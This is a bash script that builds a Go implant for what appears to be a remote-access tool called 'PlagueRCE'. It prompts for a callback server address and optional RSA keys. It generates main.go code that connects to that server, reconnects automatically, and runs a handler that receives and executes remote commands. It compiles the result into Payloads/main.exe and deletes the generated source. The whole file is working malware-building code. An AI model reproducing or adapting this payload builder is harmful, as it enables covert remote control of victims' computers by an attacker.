#!/bin/bash

# Prompt user for server IP address
read -p "Enter the server IP address and port (IP:port): " server_ip

# Prompt user for encryption mode
read -p "Do you want to use encryption mode? [y]: " use_encryption

# Prepare Go packages
go mod init "packages"
go mod tidy

# Check if encryption mode is enabled
if [ "$use_encryption" == "y" ]; then
   
    echo "Encryption mode selected"
    echo "Insert 4096 bit RSA public key (terminate with Ctrl+D when done):"
    public_key=""
    while IFS= read -r line; do
        if [[ "$line" == "END" ]]; then
            break
        fi
        public_key+="$line\n"
    done

    echo "Insert 4096 bit RSA private key (terminate with Ctrl+D when done):"
    private_key=""
    while IFS= read -r line; do
        if [[ "$line" == "END" ]]; then
            break
        fi
        private_key+="$line\n"
    done

    # Generate Go main.go file
    cat <<EOF > Code/main.go
package main

import (
	"net"
	"packages/Code/packages" // Import my local packages
	"runtime"
	"strings"
)

func main() {

	// Format RSA keys properly
	// Remove leading and trailing whitespaces from RSA keys
	var formatted_public_key string = strings.TrimSpace("$public_key")
	var formatted_private_key string = strings.TrimSpace("$private_key")
	
	var server_address string = strings.TrimSpace("$server_ip") // Server TCP/IP address
	const OSinfo string = runtime.GOOS                  // Get operating system information

	// Connect to PlagueRCE server
	conn, _ := packages.ConnectToServer(server_address)

	// Create a channel to notify the handler about the updated connection
	var conn_update chan *net.Conn = make(chan *net.Conn)

	// Start the goroutine to reconnect if disconnected from the internet
	done := make(chan struct{})
	go func() {
		packages.Reconnect(&conn, server_address, conn_update)
		close(done)
	}()

	// Start the handler to receive and execute commands
	packages.Handler_RSA(&conn, OSinfo, formatted_private_key, formatted_public_key, conn_update)

}

EOF
    
else
    # Generate Go main.go file
    cat <<EOF > Code/main.go
package main

import (
    "net"
    "packages/Code/packages" // Import my local packages
    "runtime"
    "strings"
)

func main() {

    var server_address string = strings.TrimSpace("$server_ip") // Server TCP/IP address
    const OSinfo string = runtime.GOOS        // Get operating system information

    // Connect to PlagueRCE server
    conn, _ := packages.ConnectToServer(server_address)

    // Create a channel to notify the handler about the updated connection
    var conn_update chan *net.Conn = make(chan *net.Conn)

    // Start the goroutine to reconnect if disconnected from the internet
    done := make(chan struct{})
    go func() {
        packages.Reconnect(&conn, server_address, conn_update)
        close(done)
    }()

    // Start the handler to receive and execute commands
    packages.Handler(&conn, OSinfo, conn_update)

}

EOF
fi

# Compile Go code
if go build -o Code/main Code/main.go; then
    echo "Go code compiled successfully"
else
    echo "Error: Compilation failed" >&2
    exit 1
fi

# Move executable to Payloads directory
if mv Code/main Payloads/main.exe; then
    echo "Executable moved to Payloads directory"
else
    echo "Error: Failed to move executable" >&2
    exit 1
fi

# Delete main.go from code directory
if rm Code/main.go; then
    echo "main.go deleted from code directory"
else
    echo "Error: Failed to delete main.go" >&2
    exit 1
fi

# Delete go.mod
if rm go.mod; then
    echo "go.mod deleted successfully"
else
    echo "Error: Failed to delete go.mod" >&2
    exit 1
fi